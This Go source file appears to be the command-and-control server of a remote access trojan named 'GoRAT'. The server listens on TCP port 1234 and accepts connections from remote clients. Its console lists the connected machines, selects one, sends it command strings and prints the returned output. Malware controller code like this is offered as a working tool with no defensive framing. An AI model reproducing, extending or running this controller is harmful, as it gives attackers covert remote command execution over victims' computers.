package server

import (
	"GoRAT/internal/server/render"
	"fmt"
	"github.com/pterm/pterm"
	"net"
	"strconv"
	"strings"
	"time"
)

func Server() {

	err := render.MainBanner()

	if err != nil {
		fmt.Println(err)
		return
	}

	listener, err := net.Listen("tcp", ":1234")

	var list ClientList

	if err != nil {
		fmt.Println(err)
		return
	}

	defer func(listener net.Listener) {
		err := listener.Close()
		if err != nil {
			fmt.Println(err)
			return
		}
	}(listener)

	go newConnectionHandler(listener, &list)
	input := pterm.DefaultInteractiveTextInput
	input.DefaultText = "command"

	for {

		result, err := input.WithMultiLine(false).Show()

		if err != nil {
			fmt.Print(err)
			return
		}

		if result == "h" || result == "help" {
			err := render.MainCommands()
			if err != nil {
				fmt.Println(err)
				continue
			}
		} else if result == "list" || result == "ls" {
			pterm.DefaultBasicText.WithStyle(pterm.FgDarkGray.ToStyle()).Println("Waiting ...")
			list.clientsCheck()
			render.ConnectionsHeader()
			if len(list.list) > 0 {
				for i := 0; i < len(list.list); i++ {
					pterm.DefaultBasicText.WithStyle(pterm.FgWhite.ToStyle()).Print(fmt.Sprintf("%d \t     | %s\n", i, list.list[i].name))
					pterm.DefaultBasicText.WithStyle(pterm.FgDarkGray.ToStyle()).Print("_________________________________\n")
				}
			} else {
				pterm.DefaultBasicText.WithStyle(pterm.FgDarkGray.ToStyle()).Println("Connection list is empty")
			}

		} else if strings.Contains(result, "connect") {

			command := strings.Split(result, " ")

			if index, err := strconv.Atoi(command[1]); err == nil && len(command) == 2 {

				list.clientHandler(index)
			}
		} else {
			pterm.DefaultBasicText.WithStyle(pterm.FgDarkGray.ToStyle()).Println("Wrong command. input 'h' or 'help' to show commands ")
		}

	}
}

func newConnectionHandler(listener net.Listener, list *ClientList) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println(err)
			return
		}

		client := Client{name: conn.LocalAddr().String(), conn: conn, isActual: true}
		go client.newClient(list)
	}
}

func getTextFromClient(client *Client, input string) {
	pterm.DefaultBasicText.WithStyle(pterm.FgDarkGray.ToStyle()).Println("Waiting ...")
	_, err := client.conn.Write([]byte(input))
	if err != nil {
		return
	}
	var output string
	err = client.conn.SetReadDeadline(time.Now().Add(time.Second * 5))
	if err != nil {
		return
	}
	for {

		buff := make([]byte, 5024)
		n, err := client.conn.Read(buff)
		if n == 0 || err != nil {
			break
		}
		output += string(buff[:n])
		err = client.conn.SetReadDeadline(time.Now().Add(time.Millisecond * 700))
		if err != nil {
			break
		}
	}

	pterm.DefaultBasicText.WithStyle(pterm.FgLightCyan.ToStyle()).Println(output)
}
